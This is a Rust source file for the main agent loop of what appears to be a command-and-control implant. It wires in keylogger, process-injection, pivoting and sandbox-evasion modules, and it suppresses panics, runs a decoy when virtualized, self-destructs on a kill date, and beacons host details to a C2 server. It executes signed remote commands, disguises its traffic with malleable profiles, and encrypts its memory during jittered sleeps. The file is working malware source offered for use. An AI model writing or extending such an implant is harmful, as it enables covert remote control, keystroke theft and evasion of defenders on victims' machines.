// src/agent/mod.rs
pub mod config;
pub mod handlers;
pub mod scripting;
pub mod pivot;
pub mod injection;
pub mod keylogger;
pub mod evasion; // <--- ADD THIS LINE

use tokio::sync::mpsc;
use std::sync::{Arc, Mutex};
use ed25519_dalek::{VerifyingKey, Signature, Verifier};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use rand::{Rng, RngCore};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use rand::rngs::OsRng;

use crate::common::{ClientHello, SecuredCommand, PivotFrame, C2Config, MalleableProfile};
use crate::utils;
// use crate::evasion; <--- REMOVE THIS IMPORT (it's now a sibling module 'self::evasion')
use crate::transport::ClientTransport;
use crate::lc;
use crate::traffic::DataMolder;

use self::handlers::{HandlerContext, AgentAction};
use self::scripting::ExtensionManager;
use self::pivot::PivotManager;

// Sleep Mask Implementation
async fn sleep_with_mask(config: C2Config, duration: std::time::Duration) -> C2Config {
    let config_bytes = serde_json::to_vec(&config).unwrap_or_default();
    
    let mut key = [0u8; 32];
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce_bytes);
    
    let aes_key = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
    let cipher = Aes256Gcm::new(aes_key);
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    let ciphertext = cipher.encrypt(nonce, config_bytes.as_ref())
        .expect("Sleep encryption failed");
        
    drop(config);
    
    tokio::time::sleep(duration).await;
    
    let aes_key_decrypt = aes_gcm::Key::<Aes256Gcm>::from_slice(&key);
    let cipher_decrypt = Aes256Gcm::new(aes_key_decrypt);
    
    let plaintext = cipher_decrypt.decrypt(nonce, ciphertext.as_ref())
        .expect("Sleep decryption failed");
        
    serde_json::from_slice(&plaintext).expect("Config restore failed")
}

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    // [OPSEC] Panic Suppression
    std::panic::set_hook(Box::new(|_| {}));

    let mut config = config::load();

    // Check Kill Date Immediately
    if let Some(kill_ts) = config.kill_date {
        let now = chrono::Utc::now().timestamp();
        if now > kill_ts {
            utils::self_destruct();
        }
    }

    if !config.debug {
        // UPDATE PATH HERE: self::evasion or just evasion
        if evasion::is_virtualized() { evasion::run_decoy(); }
    }

    let hwid = utils::get_persistent_id();
    let exe_id = utils::generate_exe_id(&config.hash_salt);
    
    let mut base_sleep = config.sleep_interval;
    let mut base_jitter_min = config.jitter_min;
    let mut base_jitter_max = config.jitter_max;
    
    let mut is_active_mode = false;
    
    let proxy_handle = Arc::new(Mutex::new(None));
    let ext_manager = Arc::new(Mutex::new(ExtensionManager::new()));

    // [NEW] Initialize Keylogger Buffer (required for background thread)
    let _ = keylogger::init_buffer();

    let server_pub = BASE64.decode(&config.server_public_key)?;
    let verify_key = VerifyingKey::from_bytes(&server_pub.try_into().unwrap())?;

    if config.debug {
        println!("[*] Client Started. ID: {}", hwid);
    }
    loop {
        let transport = ClientTransport::new(&config);
        let stream_result = transport.connect().await;

        if let Err(ref e) = stream_result {
            if config.debug {
                eprintln!("[-] Connection Failed: {}", e);
            }
            tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            continue;
        }

        if let Ok(stream) = stream_result {
            let (mut reader, mut writer) = tokio::io::split(stream);
            let (tx, mut rx) = mpsc::channel::<Vec<u8>>(100);
            let (cmd_tx, mut cmd_rx) = mpsc::channel::<SecuredCommand>(100);

            let pivot_mgr = Arc::new(Mutex::new(PivotManager::new(tx.clone())));

            // 1. Writer Task (Handshake Logic)
            let active_profile_tx = config.profile.clone();
            let handshake_profile = MalleableProfile::default();

            tokio::spawn(async move {
                let mut handshake_sent = false;

                while let Some(data) = rx.recv().await {
                    let profile_to_use = if !handshake_sent {
                        &handshake_profile
                    } else {
                        &active_profile_tx
                    };

                    if DataMolder::send(&mut writer, &data, profile_to_use).await.is_err() { 
                        break; 
                    }
                    handshake_sent = true;
                }
            });

            // 2. Handshake Payload
            let hello = ClientHello {
                hostname: hostname::get().unwrap_or(lc!("unknown").into()).to_string_lossy().into(),
                os: std::env::consts::OS.to_string(),
                computer_id: hwid.clone(),
                exe_id: exe_id.clone(),
                build_id: config.build_id.clone(),
            };
            if let Ok(j) = serde_json::to_vec(&hello) { let _ = tx.send(j).await; }

            // 3. Reader Task
            let active_profile_rx = config.profile.clone();
            let pivot_mgr_clone = pivot_mgr.clone();
            
            tokio::spawn(async move {
                loop {
                    let buf = match DataMolder::recv(&mut reader, &active_profile_rx).await {
                        Ok(b) => b,
                        Err(_) => break,
                    };

                    if let Ok(frame) = serde_json::from_slice::<PivotFrame>(&buf) {
                        pivot_mgr_clone.lock().unwrap().handle_downstream_frame(frame);
                        continue;
                    }

                    if let Ok(msg) = serde_json::from_slice::<SecuredCommand>(&buf) {
                        if cmd_tx.send(msg).await.is_err() { break; }
                    }
                }
            });

            // 4. Main Executor
            let mut last_counter = 0u64;
            while let Some(msg) = cmd_rx.recv().await {
                if msg.counter <= last_counter { continue; }
                
                let sign_bytes = msg.get_signable_bytes();
                let sig_bytes = BASE64.decode(&msg.signature).unwrap_or_default();
                let sig_arr: [u8; 64] = sig_bytes.try_into().unwrap_or([0u8; 64]);
                let sig = Signature::from_bytes(&sig_arr);

                if verify_key.verify(&sign_bytes, &sig).is_ok() {
                    last_counter = msg.counter;
                    if msg.command == lc!("exit") { return Ok(()); }

                    let ctx = HandlerContext {
                        proxy_handle: proxy_handle.clone(),
                        ext_manager: ext_manager.clone(),
                        c2_host: config.c2_host.clone(),
                        tx: tx.clone(),
                        pivot_mgr: pivot_mgr.clone(),
                    };

                    match handlers::dispatch(&ctx, msg).await {
                        AgentAction::UpdateConfig(s, min, max) => {
                            base_sleep = s;
                            base_jitter_min = min;
                            base_jitter_max = max;
                        },
                        AgentAction::SetMode(active) => {
                            is_active_mode = active;
                        },
                        AgentAction::None => {}
                    }

                    if is_active_mode {
                        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
                    } 
                }
            }
        } 

        // 5. Sleep with Memory Encryption (Passive Mode)
        if !is_active_mode {
            let base_ms = if base_sleep > 0 { base_sleep * 1000 } else { 5000 };
            let safe_min = base_jitter_min;
            let safe_max = if base_jitter_max < safe_min { safe_min } else { base_jitter_max };

            let jitter_ms = if safe_max > 0 {
                rand::thread_rng().gen_range(safe_min..=safe_max) as u64
            } else { 0 };
            
            let sleep_duration = std::time::Duration::from_millis(base_ms + jitter_ms);

            config = sleep_with_mask(config, sleep_duration).await;
        } else {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
        }

        // Check Kill Date on Wake
        if let Some(kill_ts) = config.kill_date {
            if chrono::Utc::now().timestamp() > kill_ts {
                utils::self_destruct();
            }
        }
    }
}
